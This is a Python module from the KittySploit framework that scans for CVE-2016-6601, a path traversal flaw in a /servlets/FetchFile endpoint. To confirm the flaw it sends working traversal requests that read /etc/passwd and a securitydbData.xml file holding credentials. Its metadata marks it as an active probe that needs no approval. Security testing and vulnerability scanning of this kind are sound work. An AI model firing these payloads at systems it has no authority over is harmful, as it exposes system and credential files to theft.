#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Multiple vendors /servlets/FetchFile path traversal (CVE-2016-6601)."""

import re

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'FetchFile Servlet - Path Traversal Detection (CVE-2016-6601)',
        'description': (
            'Detects CVE-2016-6601 by reading /etc/passwd or conf/securitydbData.xml via '
            '/servlets/FetchFile?fileName=.'
        ),
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': [
            'web', 'scanner', 'cve', 'cve2016', 'lfi', 'unauth', 'vuln',
        ],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 2,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0, 'min_params': 0,
                'tech_hints_any': [], 'tech_hints_all': [],
                'specializations_any': [], 'risk_signals_any': [],
                'auth_session': False, 'capabilities_any': [], 'capabilities_all': [],
                'confidence_min': {}, 'confidence_min_any': {},
                'endpoint_pattern_any': [], 'param_any': [], 'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [{'capability': 'file_read', 'from_detail': ''}],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['scanner/http/securitydbdata_xml_disclosure_detect'],
            },
        },
        'references': ['https://nvd.nist.gov/vuln/detail/CVE-2016-6601'],
        'cve': 'CVE-2016-6601',
    }

    def run(self):
        probe = self.http_request(method='GET', path='/servlets/FetchFile', allow_redirects=False)
        if not probe or probe.status_code >= 300:
            return False
        path = '/servlets/FetchFile?fileName=../../../../../../../etc/passwd'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if r and re.search(r'root:.*:0:0:', r.text or ''):
            self.set_info(
                severity='high',
                reason='FetchFile path traversal (CVE-2016-6601)',
                path='/servlets/FetchFile',
            )
            return True
        path2 = '/servlets/FetchFile?fileName=conf/securitydbData.xml'
        r2 = self.http_request(method='GET', path=path2, allow_redirects=False)
        if r2:
            body = r2.text or ''
            if '<AUTHORIZATION-DATA>' in body and '<DATA ownername=' in body and 'password=' in body:
                self.set_info(
                    severity='high',
                    reason='FetchFile securitydbData.xml disclosure',
                    path=path2,
                )
                return True
        return False
